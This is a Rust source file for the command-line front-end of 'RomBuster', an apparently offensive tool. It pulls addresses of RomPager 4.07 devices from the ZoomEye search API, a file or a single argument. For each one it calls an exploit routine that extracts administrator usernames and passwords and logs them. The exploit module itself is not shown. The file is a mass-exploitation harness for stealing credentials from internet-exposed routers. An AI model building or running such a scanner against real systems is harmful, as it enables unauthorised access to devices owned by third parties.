use std::fs::{self, File};
use std::io::{self, Write};
use std::path::Path;
use std::thread;
use std::time::Duration;
use clap::Parser;
use colored::*;
use reqwest::blocking::{Client, Response};
use serde_json::Value;
use crate::rombuster::RomBuster;

#[derive(Parser)]
#[clap(version = "1.0", author = "seaung")]
struct Args {
    /// Output result to file
    #[clap(short = 'o', long = "output")]
    output: Option<String>,
    
    /// Input file of addresses
    #[clap(short = 'i', long = "input")]
    input: Option<String>,
    
    /// Single address
    #[clap(short = 'a', long = "address")]
    address: Option<String>,
    
    /// Shodan API key for exploiting devices over Internet
    #[clap(long = "shodan")]
    shodan: Option<String>,
    
    /// ZoomEye API key for exploiting devices over Internet
    #[clap(long = "zoomeye")]
    zoomeye: Option<String>,
    
    /// Number of pages you want to get from ZoomEye
    #[clap(short = 'p', long = "pages", default_value = "100")]
    pages: usize,
}

pub struct RomBusterCLI {
    rom_buster: RomBuster,
    args: Args,
}

impl RomBusterCLI {
    pub fn new() -> Self {
        let args = Args::parse();
        RomBusterCLI {
            rom_buster: RomBuster::new(),
            args,
        }
    }

    fn print_success(&self, message: &str) {
        println!("{} {}", "[+]".green().bold(), message);
    }

    fn print_error(&self, message: &str) {
        eprintln!("{} {}", "[-]".red().bold(), message);
    }

    fn print_process(&self, message: &str) {
        println!("{} {}", "[*]".blue().bold(), message);
    }

    fn print_empty(&self) {
        println!();
    }

    fn thread(&self, address: &str) -> bool {
        if let Some((username, password)) = self.rom_buster.exploit(address) {
            let result = format!("({}) - {}:{}", address, username, password);
            
            if let Some(output) = &self.args.output {
                if let Ok(mut file) = File::options().append(true).create(true).open(output) {
                    writeln!(file, "{}", result).ok();
                }
            } else {
                self.print_success(&result);
            }
            return true;
        }
        false
    }

    fn crack(&self, addresses: &[String]) {
        let spinner = ['/', '-', '\\', '|'];
        let mut counter = 0;
        
        for address in addresses {
            let spinner_char = spinner[counter % spinner.len()];
            print!("\r{} Exploiting... ({}) {} ", 
                "[*]".blue().bold(), 
                address, 
                spinner_char
            );
            io::stdout().flush().unwrap();
            
            self.thread(address);
            
            counter += 1;
            thread::sleep(Duration::from_secs(2));
        }
        
        // Clear the line after finishing
        print!("\r{}\r", " ".repeat(80));
    }

    fn fetch_zoomeye_addresses(&self, api_key: &str, pages: usize) -> Vec<String> {
        let client = Client::new();
        let mut addresses = Vec::new();
        let mut page = 1;
        let pages_per_request = 20;
        let total_pages = (pages + pages_per_request - 1) / pages_per_request;

        self.print_process("Authorizing ZoomEye by given API key...");

        while page <= total_pages {
            let url = format!(
                "https://api.zoomeye.org/host/search?query=RomPager/4.07&page={}",
                page
            );

            let response = client.get(&url)
                .header("Authorization", format!("JWT {}", api_key))
                .send();

            if let Ok(res) = response {
                if let Ok(json) = res.json::<Value>() {
                    if let Some(matches) = json["matches"].as_array() {
                        for item in matches {
                            if let (Some(ip), Some(port)) = (
                                item["ip"].as_str(),
                                item["portinfo"]["port"].as_u64(),
                            ) {
                                addresses.push(format!("{}:{}", ip, port));
                            }
                        }
                    }
                }
            }
            page += 1;
        }
        addresses
    }

    fn fetch_shodan_addresses(&self, api_key: &str) -> Vec<String> {
        self.print_process("Authorizing Shodan by given API key...");
        let addresses = Vec::new();

        self.print_error("Shodan API integration is not implemented in this version");
        
        addresses
    }

    pub fn start(&self) {
        // 检查输出目录
        if let Some(output) = &self.args.output {
            if let Some(parent) = Path::new(output).parent() {
                if !parent.exists() {
                    self.print_error(&format!("Directory: {}: does not exist!", parent.display()));
                    return;
                }
            }
        }

        // 处理不同输入来源
        if let Some(api_key) = &self.args.zoomeye {
            let addresses = self.fetch_zoomeye_addresses(api_key, self.args.pages);
            self.crack(&addresses);
        } 
        else if let Some(api_key) = &self.args.shodan {
            let addresses = self.fetch_shodan_addresses(api_key);
            self.crack(&addresses);
        } 
        else if let Some(input_file) = &self.args.input {
            if !Path::new(input_file).exists() {
                self.print_error(&format!("Input file: {}: does not exist!", input_file));
                return;
            }
            
            if let Ok(content) = fs::read_to_string(input_file) {
                let addresses: Vec<String> = content.lines()
                    .map(|s| s.trim().to_string())
                    .filter(|s| !s.is_empty())
                    .collect();
                
                self.crack(&addresses);
            }
        } 
        else if let Some(address) = &self.args.address {
            self.print_process(&format!("Exploiting {}...", address));
            if !self.thread(address) {
                self.print_error(&format!("({}) - is not vulnerable!", address));
            }
        } 
        else {
            println!("---");
        }
        
        self.print_empty();
    }
}
